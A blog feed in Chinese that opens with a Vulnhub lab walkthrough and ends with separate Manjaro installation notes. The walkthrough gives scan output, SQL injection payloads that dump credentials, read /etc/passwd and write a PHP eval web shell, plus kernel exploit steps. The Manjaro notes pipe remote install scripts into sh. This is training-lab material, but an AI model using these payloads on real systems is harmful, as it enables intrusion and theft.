<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p- 10.10.10.100 -sC -sV -T5</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-11 20:18 CST</span><br><span class="line">Nmap scan report for 10.10.10.100</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)</span><br><span class="line">|   2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)</span><br><span class="line">|_  256 10:12:64:4b:7d:ff:6a:87:37:26:38:b1:44:9f:cf:5e (ECDSA)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.2.17 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   &#x2F;: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache&#x2F;2.2.17 (Ubuntu)</span><br><span class="line">|_http-title: Welcome to this Site!</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.07 seconds</span><br></pre></td></tr></table></figure>

<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;activate (Status: 302)</span><br><span class="line">&#x2F;activate.php (Status: 302)</span><br><span class="line">&#x2F;blog (Status: 301)</span><br><span class="line">&#x2F;cgi-bin&#x2F; (Status: 403)</span><br><span class="line">&#x2F;includes (Status: 301)</span><br><span class="line">&#x2F;index (Status: 200)</span><br><span class="line">&#x2F;index.php (Status: 200)</span><br><span class="line">&#x2F;info (Status: 200)</span><br><span class="line">&#x2F;info.php (Status: 200)</span><br><span class="line">&#x2F;login (Status: 200)</span><br><span class="line">&#x2F;login.php (Status: 200)</span><br><span class="line">&#x2F;register (Status: 200)</span><br><span class="line">&#x2F;register.php (Status: 200)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">2020&#x2F;07&#x2F;11 21:56:15 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;add (Status: 302)</span><br><span class="line">&#x2F;atom (Status: 200)</span><br><span class="line">&#x2F;categories (Status: 302)</span><br><span class="line">&#x2F;colors (Status: 302)</span><br><span class="line">&#x2F;config (Status: 301)</span><br><span class="line">&#x2F;comments (Status: 302)</span><br><span class="line">&#x2F;content (Status: 301)</span><br><span class="line">&#x2F;contact (Status: 200)</span><br><span class="line">&#x2F;delete (Status: 302)</span><br><span class="line">&#x2F;docs (Status: 301)</span><br><span class="line">&#x2F;flash (Status: 301)</span><br><span class="line">&#x2F;images (Status: 301)</span><br><span class="line">&#x2F;interface (Status: 301)</span><br><span class="line">&#x2F;info (Status: 302)</span><br><span class="line">&#x2F;index (Status: 200)</span><br><span class="line">&#x2F;languages (Status: 301)</span><br><span class="line">&#x2F;login (Status: 200)</span><br><span class="line">&#x2F;logout (Status: 302)</span><br><span class="line">&#x2F;options (Status: 302)</span><br><span class="line">&#x2F;rdf (Status: 200)</span><br><span class="line">&#x2F;scripts (Status: 301)</span><br><span class="line">&#x2F;rss (Status: 200)</span><br><span class="line">&#x2F;setup (Status: 302)</span><br><span class="line">&#x2F;static (Status: 302)</span><br><span class="line">&#x2F;themes (Status: 301)</span><br><span class="line">&#x2F;trackback (Status: 302)</span><br><span class="line">&#x2F;search (Status: 200)</span><br><span class="line">&#x2F;upload_img (Status: 302)</span><br><span class="line">&#x2F;upgrade (Status: 302)</span><br><span class="line">&#x2F;stats (Status: 200)</span><br></pre></td></tr></table></figure>

<h3 id="nikto扫描"><a href="#nikto扫描" class="headerlink" title="nikto扫描"></a>nikto扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nikto -h http:&#x2F;&#x2F;10.10.10.100</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          10.10.10.100</span><br><span class="line">+ Target Hostname:    10.10.10.100</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-07-11 20:18:33 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache&#x2F;2.2.17 (Ubuntu)</span><br><span class="line">+ Retrieved x-powered-by header: PHP&#x2F;5.3.5-1ubuntu7</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ Cookie PHPSESSID created without the httponly flag</span><br><span class="line">+ Uncommon header &#39;tcn&#39; found, with contents: list</span><br><span class="line">+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http:&#x2F;&#x2F;www.wisec.it&#x2F;sectou.php?id&#x3D;4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.php</span><br><span class="line">+ Apache&#x2F;2.2.17 appears to be outdated (current is at least Apache&#x2F;2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span><br><span class="line">+ OSVDB-12184: &#x2F;?&#x3D;PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;?&#x3D;PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;?&#x3D;PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;?&#x3D;PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-3268: &#x2F;includes&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: &#x2F;includes&#x2F;: This might be interesting...</span><br><span class="line">+ &#x2F;info&#x2F;: Output from the phpinfo() function was found.</span><br><span class="line">+ OSVDB-3092: &#x2F;info&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3092: &#x2F;login&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3092: &#x2F;register&#x2F;: This might be interesting...</span><br><span class="line">+ &#x2F;info.php: Output from the phpinfo() function was found.</span><br><span class="line">+ OSVDB-3233: &#x2F;info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.</span><br><span class="line">+ OSVDB-3268: &#x2F;icons&#x2F;: Directory indexing found.</span><br><span class="line">+ Server leaks inodes via ETags, header found with file &#x2F;icons&#x2F;README, inode: 1311031, size: 5108, mtime: Tue Aug 28 18:48:10 2007</span><br><span class="line">+ OSVDB-3233: &#x2F;icons&#x2F;README: Apache default file found.</span><br><span class="line">+ &#x2F;info.php?file&#x3D;http:&#x2F;&#x2F;cirt.net&#x2F;rfiinc.txt?: Output from the phpinfo() function was found.</span><br><span class="line">+ OSVDB-5292: &#x2F;info.php?file&#x3D;http:&#x2F;&#x2F;cirt.net&#x2F;rfiinc.txt?: RFI from RSnake&#39;s list (http:&#x2F;&#x2F;ha.ckers.org&#x2F;weird&#x2F;rfi-locations.dat) or from http:&#x2F;&#x2F;osvdb.org&#x2F;</span><br><span class="line">+ &#x2F;login.php: Admin login page&#x2F;section found.</span><br><span class="line">+ 8310 requests: 0 error(s) and 27 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-07-11 20:18:49 (GMT8) (16 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nikto -h http:&#x2F;&#x2F;10.10.10.100&#x2F;blog</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          10.10.10.100</span><br><span class="line">+ Target Hostname:    10.10.10.100</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-07-11 20:51:51 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache&#x2F;2.2.17 (Ubuntu)</span><br><span class="line">+ Retrieved x-powered-by header: PHP&#x2F;5.3.5-1ubuntu7</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ OSVDB-3268: &#x2F;blog&#x2F;scripts&#x2F;: Directory indexing found.</span><br><span class="line">+ Uncommon header &#39;tcn&#39; found, with contents: list</span><br><span class="line">+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http:&#x2F;&#x2F;www.wisec.it&#x2F;sectou.php?id&#x3D;4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.php</span><br><span class="line">+ Apache&#x2F;2.2.17 appears to be outdated (current is at least Apache&#x2F;2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span><br><span class="line">+ DEBUG HTTP verb may show server debugging information. See http:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;e8z01xdh%28VS.80%29.aspx for details.</span><br><span class="line">+ &#x2F;blog&#x2F;index.php&#x2F;\&quot;&gt;&lt;script&gt;&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;&lt;: eZ publish v3 and prior allow Cross Site Scripting (XSS). http:&#x2F;&#x2F;www.cert.org&#x2F;advisories&#x2F;CA-2000-02.html.</span><br><span class="line">+ OSVDB-3268: &#x2F;blog&#x2F;config&#x2F;: Directory indexing found.</span><br><span class="line">+ &#x2F;blog&#x2F;config&#x2F;: Configuration information may be available remotely.</span><br><span class="line">+ OSVDB-12184: &#x2F;blog&#x2F;?&#x3D;PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;blog&#x2F;?&#x3D;PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;blog&#x2F;?&#x3D;PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;blog&#x2F;?&#x3D;PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-3092: &#x2F;blog&#x2F;login&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3092: &#x2F;blog&#x2F;stats&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3092: &#x2F;blog&#x2F;scripts&#x2F;: This might be interesting... possibly a system shell found.</span><br><span class="line">+ OSVDB-3268: &#x2F;blog&#x2F;images&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3268: &#x2F;blog&#x2F;docs&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3268: &#x2F;blog&#x2F;images&#x2F;?pattern&#x3D;&#x2F;etc&#x2F;*&amp;sort&#x3D;name: Directory indexing found.</span><br><span class="line">+ Server leaks inodes via ETags, header found with file &#x2F;blog&#x2F;config&#x2F;config.txt, inode: 264197, size: 108, mtime: Tue May 10 07:12:22 2011</span><br><span class="line">+ &#x2F;blog&#x2F;config&#x2F;config.txt: Configuration file found.</span><br><span class="line">+ &#x2F;blog&#x2F;login.php: Admin login page&#x2F;section found.</span><br><span class="line">+ 8313 requests: 0 error(s) and 27 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-07-11 20:53:00 (GMT8) (69 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="Walkthrough-1"><a href="#Walkthrough-1" class="headerlink" title="Walkthrough-1"></a>Walkthrough-1</h3><p>经过探索，我发现<a href="http://10.10.10.100/info.php是一个phpinfo页面，它向我们揭示了网站的绝对路径`/var/www/`" target="_blank" rel="noopener">http://10.10.10.100/info.php是一个phpinfo页面，它向我们揭示了网站的绝对路径`/var/www/`</a><br><img src="https://images.atsud0.me/images/post/Screenshot_20200711_220231.jpg" alt=""></p>
<p>同时<a href="http://10.10.10.100/login.php存在sql注入漏洞。" target="_blank" rel="noopener">http://10.10.10.100/login.php存在sql注入漏洞。</a><br><img src="https://images.atsud0.me/images/post/Screenshot_20200711_220342.jpg" alt=""><br>我在这里爆破出了后台的用户名和密码，但是没什么用。</p>
<figure class="highlight plain"><figcaption><span>POST-sql</span></figcaption><table><tr><td class="code"><pre><span class="line">email&#x3D;%27 union select 1,2,3,databases(),5,6,7,8 -- &amp;pass&#x3D;1&amp;submit&#x3D;Login&amp;submitted&#x3D;TRUE</span><br><span class="line"></span><br><span class="line">email&#x3D;%27 union select 1,2,3,group_concat(table_name),5,6,7,8 from information_schema.tables where table_schema&#x3D;database()  -- &amp;pass&#x3D;1&amp;submit&#x3D;Login&amp;submitted&#x3D;TRUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">email&#x3D;%27 union select 1,2,3,group_concat(column_name),5,6,7,8 from information_schema.columns where table_schema&#x3D;&#39;ch16&#39; and table_name&#x3D;&#39;users&#39; -- &amp;pass&#x3D;1&amp;submit&#x3D;Login&amp;submitted&#x3D;TRUE</span><br><span class="line"></span><br><span class="line">email&#x3D;%27 union select 1,2,3,group_concat(email),5,6,7,8 from users -- &amp;pass&#x3D;1&amp;submit&#x3D;Login&amp;submitted&#x3D;TRUE</span><br><span class="line"></span><br><span class="line">email&#x3D;%27 union select 1,2,3,group_concat(pass),5,6,7,8 from users -- &amp;pass&#x3D;1&amp;submit&#x3D;Login&amp;submitted&#x3D;TRUE</span><br><span class="line"></span><br><span class="line">email&#x3D;%27 union select 1,2,3,load_file(&#39;&#x2F;etc&#x2F;passwd&#39;),5,6,7,8 -- &amp;pass&#x3D;1&amp;submit&#x3D;Login&amp;submitted&#x3D;TRUE</span><br><span class="line"></span><br><span class="line">email&#x3D;%27 union select 1,2,3,load_file(&#39;&#x2F;var&#x2F;www&#x2F;includes&#x2F;config.inc.php&#39;),5,6,7,8 -- &amp;pass&#x3D;1&amp;submit&#x3D;Login&amp;submitted&#x3D;TRUE</span><br><span class="line"></span><br><span class="line">email&#x3D;%27 union select 1,2,3,&#39;&lt;?php eval($_POST[admin])?&gt;&#39;,5,6,7,8 into outfile &#39;&#x2F;var&#x2F;www&#x2F;blog&#x2F;shell.php&#39; -- &amp;pass&#x3D;1&amp;submit&#x3D;Login&amp;submitted&#x3D;TRUE</span><br></pre></td></tr></table></figure>

<p>但是我在这里尝试去写文件，结果是成功写入的。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200711_220536.jpg" alt=""><br><img src="https://images.atsud0.me/images/post/Screenshot_20200711_220631.jpg" alt=""></p>
<p>蚁剑连上后，发现/var/下有两个mysqli_connect的文件，两个密码都试了一下。。结果登录成功了root用户。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200711_221545.jpg" alt=""></p>
<h3 id="Walkthrough-2"><a href="#Walkthrough-2" class="headerlink" title="Walkthrough-2"></a>Walkthrough-2</h3><p>和先前的步骤一样，从蚁剑连入然后反弹个shell回来。使用<a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank" rel="noopener">脚本</a>获取提权建议后，我选择了<a href="https://www.exploit-db.com/download/26131" target="_blank" rel="noopener">CVE-2013-2094</a>提权。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200711_222118.jpg" alt=""></p>
<h3 id="其他获得webshell的方法"><a href="#其他获得webshell的方法" class="headerlink" title="其他获得webshell的方法"></a>其他获得webshell的方法</h3><p>因为网站根目录下还有一个blog的目录，对其进行进一步信息收集后，会发现该blog使用的是<code>simple php blog</code>版本应该是0.4.0。使用<code>searchsploit</code>搜索相关的exp后，会发现该cms版本有一个<a href="https://www.exploit-db.com/exploits/1191" target="_blank" rel="noopener">远程命令执行</a></p>
<p>将这个perl脚本下载回来后运行，可以将原本blog的帐号密码，替换为自己设置的密码。最后上传个木马什么的，也可以getshell。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl 1191.pl -h http:&#x2F;&#x2F;10.10.10.100&#x2F;blog -e 3 -U hacker -P hacker</span><br></pre></td></tr></table></figure>

<h3 id="可能可行的提权方式"><a href="#可能可行的提权方式" class="headerlink" title="可能可行的提权方式"></a>可能可行的提权方式</h3><p>运行了ps -ef后，发现mysql是由root用户运行，所以可以考虑udf提权?按照这篇<a href="https://blog.csdn.net/qq_33020901/article/details/78827375" target="_blank" rel="noopener">博文</a>测试我是没有成功的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; create function sys_eval returns string soname &#39;mysqludf.so&#39;;</span><br><span class="line">create function sys_eval returns string soname &#39;mysqludf.so&#39;;</span><br><span class="line">ERROR 1126 (HY000): Can&#39;t open shared library &#39;mysqludf.so&#39; (errno: 22 &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;mysqludf.so: invalid ELF header)</span><br></pre></td></tr></table></figure>

<h3 id="失败的尝试"><a href="#失败的尝试" class="headerlink" title="失败的尝试"></a>失败的尝试</h3><p>一开始尝试了脏牛提权，但是不成功。</p>
<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>枚举是关键。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>sql-injection</tag>
        <tag>CVE-2013-2094</tag>
        <tag>simple php blog</tag>
      </tags>
  </entry>
  <entry>
    <title>manjaro安装记录</title>
    <url>/2020/04/14/manjaro%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><strong>本文写于2019/01/26日，部分命令或软件已不适用。</strong><br>本文主要记录自己在安装Manjaro系统时遇到的一些小坑。</p>
<a id="more"></a>

<p>相关链接：<br><a href="https://rovo98.coding.me/posts/a1898ce2/" target="_blank" rel="noopener">Manjaro安装与配置-rovo98&#39;sBlog</a></p>
<p><a href="https://www.jianshu.com/p/737a6ab30091" target="_blank" rel="noopener">manjaro初级安装</a></p>
<h2 id="制作镜像"><a href="#制作镜像" class="headerlink" title="制作镜像"></a>制作镜像</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd bs&#x3D;4M if&#x3D;*.iso of&#x3D;&#x2F;dev&#x2F;</span><br></pre></td></tr></table></figure>

<p>我选择的镜像是Manjaro Kde 18.02 4.19.13 windows下最好使用rfus刻录. </p>
<h2 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h2><p>需要注意的时双显卡的电脑(特别是<strong>N卡</strong>)需要修改<strong>Driver</strong>设置成<strong>No-free</strong>(但是我修改了反而进不去)<br>如果修改了或是没有修改也进不去,需要编辑<strong>Grub</strong>菜单(按E编辑)在quiet后面加入(注意空格): </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">acpi_osi&#x3D;! acpi_osi&#x3D;&#39;Windows 2009&#39;</span><br><span class="line">或者</span><br><span class="line">acpi_osi&#x3D;! acpi_osi&#x3D;Linux acpi_osi&#x3D;&#39;Windows 2015&#39; pcie_port_pm&#x3D;off</span><br></pre></td></tr></table></figure>

<p>如果是这样修改才能进入的话,在安装完系统并重启进入系统后需要修改grub参数使其永久生效. </p>
<h2 id="安装完系统后的配置"><a href="#安装完系统后的配置" class="headerlink" title="安装完系统后的配置"></a>安装完系统后的配置</h2><p>1.配置CN源: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman-mirrors -i -c China -m rank</span><br></pre></td></tr></table></figure>

<p>2.添加archCN源:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编辑文件添加</span><br><span class="line">sudo vi &#x2F;etc&#x2F;pacman.conf</span><br><span class="line"></span><br><span class="line">[archlinuxcn]</span><br><span class="line">SigLevel&#x3D; TrustedOnly</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;archlinuxcn&#x2F;$arch</span><br></pre></td></tr></table></figure>

<p>3.安装archlinuxcn-keyring: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S archlinuxcn-keyring</span><br></pre></td></tr></table></figure>

<p>4.更新系统 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -Syyu</span><br></pre></td></tr></table></figure>

<h2 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h2><p>我使用的是fcitx和rime </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fcitx-rime</span><br><span class="line">sudo pacman -S fcitx-im</span><br><span class="line">sudo pacman -S fcitx-configtool</span><br></pre></td></tr></table></figure>

<p>修改环境参数 vi ~/.xprofile </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export GTK_MODULE&#x3D;fcitx</span><br><span class="line">export QT_IM_MODULE&#x3D;fcitx</span><br><span class="line">export XMODIFIERS&#x3D;@im&#x3D;fcitx</span><br></pre></td></tr></table></figure>

<p>最后重启即可 </p>
<h2 id="安裝zsh-vim等"><a href="#安裝zsh-vim等" class="headerlink" title="安裝zsh,vim等"></a>安裝zsh,vim等</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S zsh vim git virtualbox yaourt chromium visual-studio-code-bin netease-cloud-music</span><br></pre></td></tr></table></figure>

<h3 id="zsh-配置-ohmyzsh"><a href="#zsh-配置-ohmyzsh" class="headerlink" title="zsh 配置 ohmyzsh"></a>zsh 配置 ohmyzsh</h3><p><a href="https://github.com/robbyrussell/oh-my-zsh" target="_blank" rel="noopener">ohmyzsh</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sh -c $(curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;robbyrussell&#x2F;oh-my-zsh&#x2F;master&#x2F;tools&#x2F;install.sh)</span><br></pre></td></tr></table></figure>

<h3 id="vim-配置"><a href="#vim-配置" class="headerlink" title="vim 配置"></a>vim 配置</h3><p>也可以使用这个懒人包.. <a href="https://github.com/spf13/spf13-vim" target="_blank" rel="noopener">spf13vim</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;j.mp&#x2F;spf13-vim3 -L&gt; spf13-vim.sh &amp;&amp; sh spf13-vim.sh</span><br></pre></td></tr></table></figure>

<h3 id="微信和QQ"><a href="#微信和QQ" class="headerlink" title="微信和QQ"></a>微信和QQ</h3><p>我个人是在虚拟机中使用微信和QQ的，所以在这里不写怎么安装QQ和微信了。</p>
<p>微信可以使用<a href="https://github.com/geeeeeeeeek/electronic-wechat" target="_blank" rel="noopener">微信</a>，</p>
<p>QQ好像都是用的国内deepin的wineQQ方案吧<a href="https://www.lulinux.com/archives/1319" target="_blank" rel="noopener">Linux的下安装QQ</a>，感兴趣的可以去了解一下。</p>
<p>除了QQ微信之外的聊天客户端还有电报Telegram,这个软件支持多平台，但是缺点就是需要翻墙没有好友使用吧.. </p>
<h2 id="VirtualBox安装注意"><a href="#VirtualBox安装注意" class="headerlink" title="VirtualBox安装注意"></a>VirtualBox安装注意</h2><p><a href="https://www.jianshu.com/p/ef1f58ff84d7" target="_blank" rel="noopener">参考链接</a></p>
<p>1.先确定内核版本 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure>

<p>2.安装VirtualBox时选择与内核相同的安装包</p>
<p>3.安装扩展包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -Ss virtualbox-ext-oracle</span><br></pre></td></tr></table></figure>

<p>4.重新启动系统或执行以下命令自动载入vboxdrv模块，不然打开虚拟机可能会提示&#39;modprobe vboxdrv&#39;错误。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo modprobe vboxdrv</span><br></pre></td></tr></table></figure>

<p>之后就可以正常使用了。 </p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个也不算是教程，只能算是我安装的时候的记录罢了。<br>其实我之前已经安装过很多次了。由于种种原因不断重装。</p>
<p>原本我是使用Win10+ Manjaro双系统的，Win10一直是被我当作游戏机，</p>
